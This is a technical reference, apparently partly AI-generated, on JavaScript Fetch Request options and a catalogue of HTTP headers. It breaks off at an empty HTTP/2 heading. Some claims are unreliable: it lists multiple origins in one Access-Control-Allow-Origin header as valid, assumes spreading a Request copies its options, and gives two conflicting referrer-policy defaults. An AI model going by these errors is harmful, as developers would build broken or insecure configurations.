[Inference] Automatic redirect following can leak credentials or sensitive headers to redirect targets. When redirecting cross-origin, browsers may strip certain headers like `Authorization` unless explicitly allowed. The `follow` mode's behavior with credentials depends on the redirect status code and origin relationships.

### Referrer Policy Configuration

#### Referrer Property Setting

The `referrer` property specifies the Referer header value:

```javascript
// Explicit referrer URL
const withReferrer = new Request(url, {
  referrer: 'https://example.com/page'
});

// No referrer
const noReferrer = new Request(url, {
  referrer: ''
});

// Client-based referrer (default)
const clientReferrer = new Request(url, {
  referrer: 'about:client'
});
```

Setting an empty string suppresses the Referer header. The value `'about:client'` indicates the referrer should derive from the document's URL in browser contexts.

#### Referrer Policy Directives

The `referrerPolicy` property controls how much referrer information includes:

```javascript
const request = new Request(url, {
  referrerPolicy: 'no-referrer'
});
```

Available policies:

- **no-referrer**: Never send Referer header
- **no-referrer-when-downgrade**: Send referrer to same-security destinations (HTTPS to HTTPS, HTTP to HTTP/HTTPS), omit when downgrading (HTTPS to HTTP)
- **origin**: Send only origin (scheme, host, port), not full URL
- **origin-when-cross-origin**: Send full URL for same-origin, only origin for cross-origin
- **same-origin**: Send referrer to same-origin requests only
- **strict-origin**: Send origin to same-security destinations, nothing when downgrading
- **strict-origin-when-cross-origin**: Send full URL to same-origin, origin to cross-origin same-security, nothing when downgrading
- **unsafe-url**: Always send full URL regardless of security

[Inference] The default policy varies by browser and context, typically `strict-origin-when-cross-origin` in modern browsers to balance functionality and privacy.

### Integrity Verification

#### Subresource Integrity String

The `integrity` property specifies cryptographic hashes for response verification:

```javascript
const request = new Request(url, {
  integrity: 'sha384-oqVuAfXRKap7fdgcCY5uykM6+R9GqQ8K/uxy9rx7HNQlGYl1kPzQho1wx4JwY8wC'
});
```

[Inference] The fetch implementation verifies the response body against the hash. Mismatches cause the fetch to fail with a network error. Multiple algorithms and hashes can be specified space-separated: `'sha256-abc... sha384-def...'`.

#### Integrity Check Behavior

[Inference] Integrity checks apply to the response body after decompression but before providing it to application code. The check occurs transparently - application code only sees success or failure, not the verification process details.

Integrity strings follow the format: `algorithm-base64hash`. Supported algorithms typically include `sha256`, `sha384`, and `sha512`.

### Signal Integration for Cancellation

#### AbortSignal Association

The `signal` property associates an AbortSignal enabling request cancellation:

```javascript
const controller = new AbortController();

const request = new Request(url, {
  signal: controller.signal
});

// Later, cancel the request
controller.abort();
```

When the signal aborts, any pending fetch using this Request immediately fails with an `AbortError` DOMException.

#### Signal State at Construction

[Inference] If the signal is already aborted at Request construction time, the Request is still created successfully. The abortion only affects fetch operations using the Request:

```javascript
const controller = new AbortController();
controller.abort(); // Abort immediately

const request = new Request(url, {
  signal: controller.signal
}); // Succeeds

fetch(request); // Fails immediately with AbortError
```

#### Multiple Fetch with Same Signal

A single Request with an aborted signal can be used in multiple fetch calls, all failing immediately:

```javascript
const controller = new AbortController();
const request = new Request(url, { signal: controller.signal });

const promise1 = fetch(request.clone());
const promise2 = fetch(request.clone());

controller.abort(); // Both fetches fail
```

### Priority Hints

#### Priority Property Configuration

The `priority` property provides hints about request importance:

```javascript
const highPriority = new Request(url, {
  priority: 'high'
});

const lowPriority = new Request(url, {
  priority: 'low'
});

const autoPriority = new Request(url, {
  priority: 'auto'
});
```

**high**: Indicates critical resources that should load as quickly as possible.

**low**: Indicates non-critical resources that can defer to higher priority loads.

**auto**: Allows browser default prioritization based on resource type and context.

[Inference] Priority hints are advisory - browsers use them to optimize resource loading but may override based on other factors like resource type, visibility, or network conditions. The actual impact varies significantly across browsers and implementations.

### Keepalive Configuration

#### Keepalive Flag Purpose

The `keepalive` property enables requests to outlive the page:

```javascript
const keepaliveRequest = new Request(url, {
  method: 'POST',
  body: analyticsData,
  keepalive: true
});
```

[Inference] Setting `keepalive: true` allows the fetch to continue even if the user navigates away or closes the tab. This suits analytics beacons or cleanup operations that should complete regardless of page lifetime.

#### Keepalive Limitations

[Inference] Keepalive requests face strict size limitations (typically 64KB) to prevent resource exhaustion from abandoned pages. Exceeding the limit throws an error during fetch, not during Request construction. The limit applies to the total keepalive request payload across all pending keepalive requests from the origin.

### Duplex Communication Mode

#### Duplex Property for Streaming

The `duplex` property controls bidirectional communication with streaming bodies:

```javascript
const request = new Request(url, {
  method: 'POST',
  body: readableStream,
  duplex: 'half'
});
```

[Inference] The `duplex: 'half'` value allows uploading streaming request bodies while receiving the response. This enables upload progress tracking or streaming data that generates during the upload phase.

**half**: Currently the only specified value, indicating half-duplex communication where request upload and response reception can overlap but not simultaneous bidirectional streaming.

[Inference] Full duplex support may be specified in future standards but isn't currently available through the Request API. Half-duplex allows response headers and partial response body to arrive before request body completes uploading.

### Request Property Immutability

#### Frozen State After Construction

Request objects are immutable after creation. Properties are read-only:

```javascript
const request = new Request(url, {
  method: 'GET'
});

request.method = 'POST'; // No effect, property is read-only
request.url = 'https://other.com'; // No effect
```

Headers are mutable through the Headers object methods, but the headers property itself cannot be reassigned:

```javascript
request.headers.set('X-Custom', 'value'); // Works
request.headers = new Headers(); // No effect
```

#### Rationale for Immutability

[Inference] Immutability prevents accidental modification of requests after creation, particularly important when requests pass through multiple functions or middleware. It ensures request integrity and makes behavior predictable - a Request has the same properties throughout its lifetime.

### Factory Pattern Alternatives

#### Builder Pattern Implementation

Custom builder patterns enable incremental request construction:

```javascript
class RequestBuilder {
  constructor(url) {
    this.url = url;
    this.options = {};
  }
  
  method(method) {
    this.options.method = method;
    return this;
  }
  
  header(name, value) {
    if (!this.options.headers) {
      this.options.headers = {};
    }
    this.options.headers[name] = value;
    return this;
  }
  
  body(body) {
    this.options.body = body;
    return this;
  }
  
  mode(mode) {
    this.options.mode = mode;
    return this;
  }
  
  build() {
    return new Request(this.url, this.options);
  }
}

// Usage
const request = new RequestBuilder('https://api.example.com/data')
  .method('POST')
  .header('Content-Type', 'application/json')
  .body(JSON.stringify({ key: 'value' }))
  .mode('cors')
  .build();
```

This pattern provides fluent API for complex request construction, improving readability for multi-option requests.

#### Template Pattern for Base Configuration

Template requests establish common configurations:

```javascript
const baseRequest = new Request('https://api.example.com', {
  mode: 'cors',
  credentials: 'include',
  headers: {
    'Authorization': 'Bearer token',
    'Content-Type': 'application/json'
  }
});

function createAPIRequest(path, options = {}) {
  return new Request(baseRequest.url + path, {
    ...baseRequest,
    headers: new Headers(baseRequest.headers),
    ...options
  });
}

const userRequest = createAPIRequest('/users', { method: 'POST', body: userData });
```

[Inference] Spreading baseRequest copies primitive properties but not Headers objects. Headers require explicit cloning to prevent shared mutations.

### Memory and Performance Considerations

#### Request Object Allocation Cost

Each Request instantiation allocates memory for the Request object, Headers object, and potentially body stream objects. [Inference] Creating numerous Request objects in tight loops or high-frequency code paths may create garbage collection pressure.

Reusing Request objects when possible reduces allocations:

```javascript
// Less efficient - creates new Request per call
function fetchUser(id) {
  return fetch(new Request(`https://api.example.com/users/${id}`));
}

// More efficient - reuses base configuration
const baseRequest = new Request('https://api.example.com/users/', {
  mode: 'cors',
  credentials: 'include'
});

function fetchUser(id) {
  return fetch(new Request(baseRequest.url + id, baseRequest));
}
```

#### Body Stream Memory Implications

Large request bodies, particularly streaming bodies, consume memory proportional to buffered data. [Inference] Creating Request objects with large bodies doesn't immediately copy the data - ReadableStream bodies remain lazy until consumed. However, cloning requests with large bodies may duplicate stream buffers.

```javascript
const largeFile = new Blob([largeArrayBuffer]);
const request = new Request(url, { method: 'POST', body: largeFile });

// Clone potentially duplicates buffer
const clone = request.clone();
```

#### Header Optimization

Headers objects allocate storage for header entries. [Inference] Excessive headers increase Request memory footprint, though typically negligible compared to body sizes:

```javascript
// Minimal overhead
const request = new Request(url, {
  headers: {
    'Content-Type': 'application/json'
  }
});

// Larger overhead with many headers
const request = new Request(url, {
  headers: {
    'Header-1': 'value1',
    'Header-2': 'value2',
    // ... many headers
    'Header-50': 'value50'
  }
});
```

### Validation and Error Handling

#### Constructor Validation Errors

Request construction throws TypeError for invalid configurations:

```javascript
// Invalid URL
try {
  new Request('not a url');
} catch (e) {
  console.log(e instanceof TypeError); // true
}

// Invalid method-body combination
try {
  new Request(url, {
    method: 'GET',
    body: 'data'
  });
} catch (e) {
  console.log(e instanceof TypeError); // true
}

// Invalid mode
try {
  new Request(url, {
    mode: 'invalid-mode'
  });
} catch (e) {
  console.log(e instanceof TypeError); // true
}
```

[Inference] Validation occurs synchronously during construction, making invalid configurations immediately detectable through try-catch.

#### Property Access Error Conditions

[Inference] Accessing Request properties doesn't throw errors under normal circumstances. Properties return their values or defaults even for edge cases:

```javascript
const request = new Request(url);

console.log(request.body); // null (no body)
console.log(request.headers.get('Nonexistent')); // null
console.log(request.url); // The full URL string
```

Errors during property access would indicate implementation bugs rather than expected behavior.

#### Body Reading Error Scenarios

Body reading methods throw when bodies are already consumed or when the Request is disturbed:

```javascript
const request = new Request(url, { method: 'POST', body: 'data' });

await request.text();

try {
  await request.json(); // Body already consumed
} catch (e) {
  console.log(e instanceof TypeError); // true
}
```

[Inference] The bodyUsed property provides non-throwing detection of consumption state before attempting reads.

---

# Request Headers

## Standard HTTP Headers

### General Headers

Headers applicable to both requests and responses, providing information about the message itself rather than the content.

**Cache-Control**

Directives for caching mechanisms in both requests and responses.

Request directives:

- `no-cache`: Requires validation with origin server before using cached response
- `no-store`: Prohibits storage of request or response
- `max-age=<seconds>`: Maximum age of cached response client will accept
- `max-stale[=<seconds>]`: Client accepts stale responses
- `min-fresh=<seconds>`: Client wants response fresh for at least specified time
- `no-transform`: Intermediaries must not transform content
- `only-if-cached`: Client wants cached response only, no network fetch

Response directives:

- `public`: Any cache may store response
- `private`: Only client-specific cache may store response
- `no-cache`: Must revalidate with origin before using
- `no-store`: Must not store any part of request or response
- `max-age=<seconds>`: Maximum time response considered fresh
- `s-maxage=<seconds>`: Overrides max-age for shared caches
- `must-revalidate`: Once stale, must revalidate before reuse
- `proxy-revalidate`: Like must-revalidate but only for shared caches
- `immutable`: Response body will not change; revalidation unnecessary
- `stale-while-revalidate=<seconds>`: Serve stale response while revalidating
- `stale-if-error=<seconds>`: Serve stale response if revalidation fails

**Connection**

Controls whether network connection stays open after current transaction.

Values:

- `keep-alive`: Maintain persistent connection
- `close`: Close connection after response
- `Upgrade`: Connection will upgrade to different protocol

HTTP/1.1 defaults to `keep-alive`. HTTP/2 prohibits this header.

**Date**

Timestamp when message was originated.

```
Date: Wed, 21 Oct 2015 07:28:00 GMT
```

Format follows RFC 5322 (updated RFC 2822). All HTTP dates use GMT timezone.

**Pragma**

Legacy HTTP/1.0 cache control. Only defined value:

```
Pragma: no-cache
```

Equivalent to `Cache-Control: no-cache`. Included for backward compatibility.

**Trailer**

Indicates presence of trailer fields in chunked transfer encoding.

```
Trailer: Expires, Content-MD5
```

Allows header fields after message body in chunked encoding.

**Transfer-Encoding**

Specifies encoding form used to transfer message body.

```
Transfer-Encoding: chunked
Transfer-Encoding: compress, chunked
```

Values: `chunked`, `compress`, `deflate`, `gzip`, `identity`

Applied in order listed. Must include `chunked` if used.

**Upgrade**

Proposes protocol upgrade or switch.

```
Upgrade: HTTP/2.0, SHTTP/1.3, IRC/6.9, RTA/x11
```

Paired with `Connection: Upgrade`. Server responds with `101 Switching Protocols` if accepting.

**Via**

Added by proxies and gateways to track message forwarding.

```
Via: 1.1 vegur
Via: 1.0 fred, 1.1 example.com (Apache/1.1)
```

Format: `<protocol-version> <received-by> [<comment>]`

**Warning**

Carries additional information about message status or transformation.

```
Warning: 110 anderson/1.3.37 "Response is stale"
Warning: 299 - "Miscellaneous warning"
```

Format: `<warn-code> <warn-agent> "<warn-text>" ["<warn-date>"]`

Common codes:

- `110`: Response is Stale
- `111`: Revalidation Failed
- `112`: Disconnected Operation
- `113`: Heuristic Expiration
- `199`: Miscellaneous Warning
- `214`: Transformation Applied
- `299`: Miscellaneous Persistent Warning

### Request Headers

Headers sent by client to provide information about request or client preferences.

**Accept**

Media types client can process, with quality values.

```
Accept: text/html, application/xhtml+xml, application/xml;q=0.9, */*;q=0.8
Accept: application/json
```

Quality values (q) range 0-1, default 1.0. Server selects best match.

**Accept-Charset**

Character sets client supports.

```
Accept-Charset: utf-8, iso-8859-1;q=0.5
Accept-Charset: utf-8, *;q=0.8
```

UTF-8 assumed acceptable if not specified. Largely deprecated as UTF-8 dominates.

**Accept-Encoding**

Compression algorithms client supports.

```
Accept-Encoding: gzip, deflate, br
Accept-Encoding: gzip;q=1.0, identity;q=0.5, *;q=0
```

Common values: `gzip`, `deflate`, `br` (Brotli), `compress`, `identity` (no encoding), `*` (any)

**Accept-Language**

Preferred natural languages for response.

```
Accept-Language: en-US, en;q=0.9, fr;q=0.8
Accept-Language: de-DE, de;q=0.9, en;q=0.8
```

Language tags follow RFC 5646. Quality values indicate preference.

**Authorization**

Credentials for authenticating client to server.

```
Authorization: Basic dXNlcjpwYXNzd29yZA==
Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...
Authorization: Digest username="user", realm="protected", nonce="dcd98b7102dd2f0e8b11d0f600bfb0c093"
```

Schemes: `Basic`, `Bearer`, `Digest`, `HOBA`, `Mutual`, `Negotiate`, `OAuth`, `SCRAM-SHA-1`, `SCRAM-SHA-256`, `vapid`

**Cookie**

Stored cookies sent to server.

```
Cookie: sessionid=abc123; theme=dark; lang=en
```

Multiple cookies separated by semicolons. No quality values or attributes (those only in Set-Cookie).

**Expect**

Expected behavior server must support.

```
Expect: 100-continue
```

Only defined expectation is `100-continue`. Client expects server to respond with `100 Continue` before sending request body. Useful for large payloads to avoid sending data to servers that will reject.

**From**

Email address of user controlling client.

```
From: user@example.com
```

Intended for logging and identifying source of invalid requests. Privacy concerns limit usage.

**Host**

Domain name and port of target server.

```
Host: example.com
Host: example.com:8080
```

Required in HTTP/1.1. Enables virtual hosting (multiple domains on single IP).

**If-Match**

Makes request conditional on matching ETag.

```
If-Match: "33a64df551425fcc55e4d42a148795d9f25f89d4"
If-Match: "v1", "v2", "v3"
If-Match: *
```

Used with PUT/PATCH/DELETE to prevent lost updates. Server returns `412 Precondition Failed` if no match.

**If-Modified-Since**

Makes GET/HEAD conditional on modification date.

```
If-Modified-Since: Wed, 21 Oct 2015 07:28:00 GMT
```

Server returns `304 Not Modified` if resource unchanged since specified date.

**If-None-Match**

Makes request conditional on non-matching ETag.

```
If-None-Match: "33a64df551425fcc55e4d42a148795d9f25f89d4"
If-None-Match: "v1", "v2", "v3"
If-None-Match: *
```

For GET/HEAD: Returns `304 Not Modified` if ETag matches. For other methods: Returns `412 Precondition Failed` if ETag matches.

Used for cache validation and preventing lost updates.

**If-Range**

Combines conditional request with range request.

```
If-Range: "33a64df551425fcc55e4d42a148795d9f25f89d4"
If-Range: Wed, 21 Oct 2015 07:28:00 GMT
```

If condition matches, server returns specified range. Otherwise, returns entire resource.

**If-Unmodified-Since**

Makes request conditional on no modification since date.

```
If-Unmodified-Since: Wed, 21 Oct 2015 07:28:00 GMT
```

Server returns `412 Precondition Failed` if resource modified. Used with unsafe methods to prevent lost updates.

**Max-Forwards**

Limits proxy/gateway hops for TRACE and OPTIONS methods.

```
Max-Forwards: 10
```

Each proxy decrements value. At zero, proxy must respond rather than forward.

**Proxy-Authorization**

Credentials for authenticating to proxy.

```
Proxy-Authorization: Basic dXNlcjpwYXNzd29yZA==
```

Similar to Authorization but for proxy authentication.

**Range**

Requests specific byte range(s) of resource.

```
Range: bytes=0-1023
Range: bytes=0-1023, 2048-4095
Range: bytes=-1024
Range: bytes=1024-
```

Formats:

- `bytes=<start>-<end>`: Specific range (inclusive)
- `bytes=-<suffix-length>`: Last N bytes
- `bytes=<start>-`: From start to end
- Multiple ranges separated by commas

**Referer**

URL of page that linked to current request.

```
Referer: https://example.com/page.html
```

Misspelling is intentional (historical). Used for analytics, logging, caching optimization. Privacy-sensitive.

**TE**

Transfer encodings client accepts in response.

```
TE: trailers
TE: trailers, deflate;q=0.5
```

Similar to Accept-Encoding but for transfer encodings (not content encodings). `trailers` indicates client accepts trailer fields.

**User-Agent**

Client software identification.

```
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36
User-Agent: curl/7.64.1
```

Format varies widely. Contains browser/client name, version, platform, rendering engine. Used for statistics, compatibility detection.

### Response Headers

Headers sent by server providing information about response or server.

**Accept-Ranges**

Indicates server support for range requests.

```
Accept-Ranges: bytes
Accept-Ranges: none
```

`bytes`: Server supports byte-range requests `none`: Server does not support range requests

**Age**

Time in seconds since response generated at origin server.

```
Age: 3600
```

Primarily used by caches to indicate staleness.

**ETag**

Identifier for specific version of resource.

```
ETag: "33a64df551425fcc55e4d42a148795d9f25f89d4"
ETag: W/"33a64df551425fcc55e4d42a148795d9f25f89d4"
```

Strong ETags: Any change produces different value Weak ETags: Prefixed with `W/`, semantically equivalent resources may share

Used for cache validation and optimistic concurrency control.

**Location**

URL to redirect client or location of newly created resource.

```
Location: https://example.com/new-location
Location: /new-page
```

Used with 3xx redirects and 201 Created status. Can be absolute or relative URL.

**Proxy-Authenticate**

Authentication method proxy requires.

```
Proxy-Authenticate: Basic realm="Access to internal site"
```

Sent with `407 Proxy Authentication Required`. Similar to WWW-Authenticate but for proxies.

**Retry-After**

Indicates how long client should wait before making follow-up request.

```
Retry-After: 120
Retry-After: Wed, 21 Oct 2015 07:28:00 GMT
```

Used with `503 Service Unavailable` or `429 Too Many Requests`. Value in seconds or HTTP date.

**Server**

Information about origin server software.

```
Server: Apache/2.4.1 (Unix)
Server: nginx/1.21.0
Server: cloudflare
```

Analogous to User-Agent. Often simplified or removed for security reasons.

**Vary**

Lists request headers that determine response variation.

```
Vary: Accept-Encoding
Vary: User-Agent, Accept-Encoding
Vary: *
```

Tells caches which headers create different response versions. `*` means response varies based on factors not expressible via headers.

**WWW-Authenticate**

Authentication method required for resource access.

```
WWW-Authenticate: Basic realm="Protected Area"
WWW-Authenticate: Bearer realm="example", charset="UTF-8"
WWW-Authenticate: Digest realm="protected", qop="auth", nonce="dcd98b7102dd2f0e8b11d0f600bfb0c093"
```

Sent with `401 Unauthorized`. Can specify multiple challenges.

### Entity Headers

Headers describing message body content or resource.

**Allow**

Lists HTTP methods resource supports.

```
Allow: GET, HEAD, OPTIONS
Allow: GET, POST, PUT, DELETE
```

Used with `405 Method Not Allowed` or OPTIONS response.

**Content-Encoding**

Encoding transformations applied to message body.

```
Content-Encoding: gzip
Content-Encoding: deflate, gzip
```

Applied encodings listed in order. Client must decode in reverse order. Different from Transfer-Encoding (which applies to message transport).

**Content-Language**

Natural language(s) of intended audience.

```
Content-Language: en
Content-Language: en-US
Content-Language: en, fr
```

Does not necessarily describe all languages in content.

**Content-Length**

Size of message body in bytes.

```
Content-Length: 3495
```

Required for persistent connections unless using chunked encoding. Must match actual body size.

**Content-Location**

Alternate URL for returned content.

```
Content-Location: /documents/report.pdf
Content-Location: https://example.com/documents/report.pdf
```

Indicates URL where identical resource can be accessed. Useful when content negotiation or other mechanisms return variant.

**Content-MD5**

Base64-encoded MD5 hash of message body.

```
Content-MD5: Q2hlY2sgSW50ZWdyaXR5IQ==
```

Provides end-to-end integrity check. Deprecated in favor of other integrity mechanisms.

**Content-Range**

Indicates position of partial content within full resource.

```
Content-Range: bytes 0-1023/5000
Content-Range: bytes 2048-4095/*
Content-Range: bytes */5000
```

Format: `<unit> <range-start>-<range-end>/<total-size>`

`*` for unknown values. Used with `206 Partial Content` or `416 Range Not Satisfiable`.

**Content-Type**

Media type of message body.

```
Content-Type: text/html; charset=utf-8
Content-Type: application/json
Content-Type: multipart/form-data; boundary=----WebKitFormBoundary7MA4YWxkTrZu0gW
```

Includes media type and optional parameters (charset, boundary). Essential for proper content interpretation.

**Expires**

Date/time after which response considered stale.

```
Expires: Wed, 21 Oct 2015 07:28:00 GMT
Expires: 0
```

HTTP date or invalid date (`0`) for already-expired. `Cache-Control: max-age` takes precedence if both present.

**Last-Modified**

Date/time resource last modified.

```
Last-Modified: Wed, 21 Oct 2015 07:28:00 GMT
```

Used for cache validation with If-Modified-Since. Less precise than ETags but widely supported.

### CORS Headers

Headers controlling cross-origin resource sharing.

**Access-Control-Allow-Origin**

Specifies origins permitted to access resource.

```
Access-Control-Allow-Origin: *
Access-Control-Allow-Origin: https://example.com
Access-Control-Allow-Origin: https://example.com, https://another.com
```

`*` allows all origins. Specific origins required when credentials included.

**Access-Control-Allow-Credentials**

Indicates whether response can be exposed when credentials included.

```
Access-Control-Allow-Credentials: true
```

Only valid value is `true`. Omit if false. Cannot combine with `Access-Control-Allow-Origin: *`.

**Access-Control-Allow-Methods**

Lists HTTP methods allowed for cross-origin requests.

```
Access-Control-Allow-Methods: GET, POST, PUT, DELETE, OPTIONS
```

Responds to preflight OPTIONS request.

**Access-Control-Allow-Headers**

Lists headers allowed in actual request.

```
Access-Control-Allow-Headers: Content-Type, Authorization, X-Custom-Header
```

Responds to preflight OPTIONS request specifying which custom headers permitted.

**Access-Control-Expose-Headers**

Lists response headers accessible to client-side code.

```
Access-Control-Expose-Headers: Content-Length, X-Request-ID
```

By default, only simple response headers exposed: Cache-Control, Content-Language, Content-Type, Expires, Last-Modified, Pragma.

**Access-Control-Max-Age**

How long preflight response can be cached.

```
Access-Control-Max-Age: 86400
```

Value in seconds. Reduces preflight request frequency.

**Access-Control-Request-Method**

Used in preflight to indicate actual request method.

```
Access-Control-Request-Method: PUT
```

Sent by browser in OPTIONS preflight request.

**Access-Control-Request-Headers**

Used in preflight to indicate actual request headers.

```
Access-Control-Request-Headers: Content-Type, X-Custom-Header
```

Sent by browser in OPTIONS preflight request.

**Origin**

Indicates request origin (scheme, host, port).

```
Origin: https://example.com
Origin: https://example.com:8080
```

Sent automatically by browsers for cross-origin requests. Servers use for CORS decisions.

### Security Headers

Headers enhancing security of web applications.

**Content-Security-Policy**

Controls resources browser allowed to load.

```
Content-Security-Policy: default-src 'self'; script-src 'self' https://trusted.cdn.com; style-src 'self' 'unsafe-inline'
```

Directives:

- `default-src`: Fallback for other directives
- `script-src`: Valid JavaScript sources
- `style-src`: Valid stylesheet sources
- `img-src`: Valid image sources
- `connect-src`: Valid AJAX/WebSocket/EventSource endpoints
- `font-src`: Valid font sources
- `object-src`: Valid plugin sources
- `media-src`: Valid audio/video sources
- `frame-src`: Valid iframe sources
- `frame-ancestors`: Valid parent frames
- `base-uri`: Valid <base> element URLs
- `form-action`: Valid form submission targets
- `upgrade-insecure-requests`: Upgrades HTTP to HTTPS
- `block-all-mixed-content`: Blocks HTTP resources on HTTPS pages

**Content-Security-Policy-Report-Only**

CSP in report-only mode (violations reported but not enforced).

```
Content-Security-Policy-Report-Only: default-src 'self'; report-uri /csp-violation-report
```

Allows testing policies before enforcement.

**Strict-Transport-Security**

Enforces HTTPS connections.

```
Strict-Transport-Security: max-age=31536000; includeSubDomains; preload
```

Parameters:

- `max-age`: Duration (seconds) to remember HTTPS-only rule
- `includeSubDomains`: Apply to all subdomains
- `preload`: Request inclusion in browser HSTS preload lists

**X-Content-Type-Options**

Prevents MIME type sniffing.

```
X-Content-Type-Options: nosniff
```

Only defined value: `nosniff`. Forces browser to respect declared Content-Type.

**X-Frame-Options**

Controls whether page can be displayed in frame/iframe.

```
X-Frame-Options: DENY
X-Frame-Options: SAMEORIGIN
X-Frame-Options: ALLOW-FROM https://example.com
```

Values:

- `DENY`: No framing allowed
- `SAMEORIGIN`: Only same-origin framing
- `ALLOW-FROM <uri>`: Specific origin allowed (limited browser support)

Largely superseded by CSP `frame-ancestors` directive.

**X-XSS-Protection**

Enables/configures XSS filter in older browsers.

```
X-XSS-Protection: 0
X-XSS-Protection: 1
X-XSS-Protection: 1; mode=block
X-XSS-Protection: 1; report=https://example.com/report
```

Largely deprecated. Modern browsers rely on CSP instead.

**Referrer-Policy**

Controls referrer information sent with requests.

```
Referrer-Policy: no-referrer
Referrer-Policy: no-referrer-when-downgrade
Referrer-Policy: origin
Referrer-Policy: origin-when-cross-origin
Referrer-Policy: same-origin
Referrer-Policy: strict-origin
Referrer-Policy: strict-origin-when-cross-origin
Referrer-Policy: unsafe-url
```

Policies:

- `no-referrer`: Never send referrer
- `no-referrer-when-downgrade`: Send except HTTPS→HTTP (default)
- `origin`: Send only origin
- `origin-when-cross-origin`: Full URL for same-origin, origin only cross-origin
- `same-origin`: Send only for same-origin requests
- `strict-origin`: Send origin except HTTPS→HTTP
- `strict-origin-when-cross-origin`: Full URL same-origin, origin cross-origin (except HTTPS→HTTP)
- `unsafe-url`: Always send full URL

**Permissions-Policy**

Controls browser features and APIs available to page.

```
Permissions-Policy: geolocation=(), microphone=(), camera=(self)
Permissions-Policy: payment=(self "https://trusted-payment.com")
```

Formerly Feature-Policy. Format: `<directive>=(<allowlist>)`

Common directives: `accelerometer`, `ambient-light-sensor`, `autoplay`, `battery`, `camera`, `display-capture`, `geolocation`, `gyroscope`, `magnetometer`, `microphone`, `midi`, `payment`, `usb`, `vibrate`, `vr`

Allowlist values: `*` (all origins), `self` (same origin), `src` (iframe src), `none`/`()` (blocked), specific origins

**Cross-Origin-Embedder-Policy**

Controls loading cross-origin resources without explicit permission.

```
Cross-Origin-Embedder-Policy: unsafe-none
Cross-Origin-Embedder-Policy: require-corp
```

Values:

- `unsafe-none`: Default, no restrictions
- `require-corp`: Resources must have CORP header or be same-origin

Required for certain powerful features like SharedArrayBuffer.

**Cross-Origin-Opener-Policy**

Isolates browsing context from cross-origin windows.

```
Cross-Origin-Opener-Policy: unsafe-none
Cross-Origin-Opener-Policy: same-origin
Cross-Origin-Opener-Policy: same-origin-allow-popups
```

Values:

- `unsafe-none`: Default, no isolation
- `same-origin`: Isolates from cross-origin windows
- `same-origin-allow-popups`: Same-origin isolation except popups to non-COOP pages

**Cross-Origin-Resource-Policy**

Declares whether resource can be loaded cross-origin.

```
Cross-Origin-Resource-Policy: same-origin
Cross-Origin-Resource-Policy: same-site
Cross-Origin-Resource-Policy: cross-origin
```

Protects against side-channel attacks like Spectre.

### Custom and Extension Headers

**X-Forwarded-For**

Identifies originating client IP when behind proxies.

```
X-Forwarded-For: 203.0.113.195
X-Forwarded-For: 203.0.113.195, 70.41.3.18, 150.172.238.178
```

Left-most IP is original client. Each proxy appends client IP it saw.

Not standardized. `Forwarded` header is standardized replacement.

**X-Forwarded-Host**

Original Host header value when behind proxies.

```
X-Forwarded-Host: example.com
```

**X-Forwarded-Proto**

Original protocol (HTTP/HTTPS) when behind proxies.

```
X-Forwarded-Proto: https
```

**Forwarded**

Standardized version of X-Forwarded-* headers.

```
Forwarded: for=192.0.2.60;proto=http;by=203.0.113.43
Forwarded: for=192.0.2.43, for=198.51.100.17
```

Parameters: `by` (proxy interface), `for` (client), `host` (original Host), `proto` (protocol)

**X-Real-IP**

Alternative to X-Forwarded-For, typically single IP.

```
X-Real-IP: 203.0.113.195
```

Used by some proxies (notably nginx).

**X-Request-ID** / **X-Correlation-ID**

Unique identifier for tracking request through distributed systems.

```
X-Request-ID: f058ebd6-02f7-4d3f-942e-904344e8cde5
X-Correlation-ID: abc123-def456-ghi789
```

Format varies. Often UUID. Helps correlate logs across services.

**X-Powered-By**

Technology powering the website.

```
X-Powered-By: PHP/7.4.3
X-Powered-By: Express
```

Often removed in production for security (information leakage).

**X-Rate-Limit-***

Rate limiting information.

```
X-Rate-Limit-Limit: 100
X-Rate-Limit-Remaining: 87
X-Rate-Limit-Reset: 1634567890
```

Not standardized. Various conventions exist. Common headers:

- `X-Rate-Limit-Limit`: Maximum requests per window
- `X-Rate-Limit-Remaining`: Remaining requests in current window
- `X-Rate-Limit-Reset`: Timestamp when limit resets (Unix epoch or HTTP date)

### Cookie-Related Headers

**Set-Cookie**

Sends cookie from server to client.

```
Set-Cookie: sessionid=abc123; Path=/; Domain=example.com; Secure; HttpOnly; SameSite=Strict; Max-Age=3600
```

Attributes:

- `Expires`: Expiration date (HTTP date format)
- `Max-Age`: Lifetime in seconds (takes precedence over Expires)
- `Domain`: Domain cookie valid for (defaults to current domain, excluding subdomains)
- `Path`: URL path cookie valid for (defaults to current path)
- `Secure`: Only send over HTTPS
- `HttpOnly`: Inaccessible to JavaScript
- `SameSite`: CSRF protection
    - `Strict`: Only same-site requests
    - `Lax`: Same-site + top-level navigation from external sites
    - `None`: All requests (requires Secure)

Multiple Set-Cookie headers can appear in single response (one per cookie).

### Content Negotiation Headers

**Accept-Patch**

Advertises supported patch document formats.

```
Accept-Patch: application/json-patch+json, application/merge-patch+json
```

Sent in OPTIONS response or 415 Unsupported Media Type.

**Accept-Post**

Advertises supported POST request content types.

```
Accept-Post: application/json, application/xml, text/plain
```

Informs clients which media types server accepts for POST.

**Accept-Datetime**

Requests specific datetime version of resource (Memento protocol).

```
Accept-Datetime: Thu, 31 May 2007 20:35:00 GMT
```

Used with web archives and versioned resources.

### WebSocket Headers

**Sec-WebSocket-Key**

Random value proving browser supports WebSockets.

```
Sec-WebSocket-Key: dGhlIHNhbXBsZSBub25jZQ==
```

Base64-encoded random 16-byte value. Server uses to compute Sec-WebSocket-Accept.

**Sec-WebSocket-Accept**

Server's computed response to Sec-WebSocket-Key.

```
Sec-WebSocket-Accept: s3pPLMBiTxaQ9kYGzzhZRbK+xOo=
```

Proves server understands WebSocket protocol. Computed from key + magic string, SHA-1 hashed, base64-encoded.

**Sec-WebSocket-Version**

WebSocket protocol version.

```
Sec-WebSocket-Version: 13
```

Current version is 13.

**Sec-WebSocket-Protocol**

Requested sub-protocols.

```
Sec-WebSocket-Protocol: chat, superchat
```

Client proposes application-level protocols. Server selects one in response.

**Sec-WebSocket-Extensions**

Requested protocol extensions.

```
Sec-WebSocket-Extensions: permessage-deflate; client_max_window_bits
```

Common extension: `permessage-deflate` (compression)

### HTTP/2 Pseudo-Headers

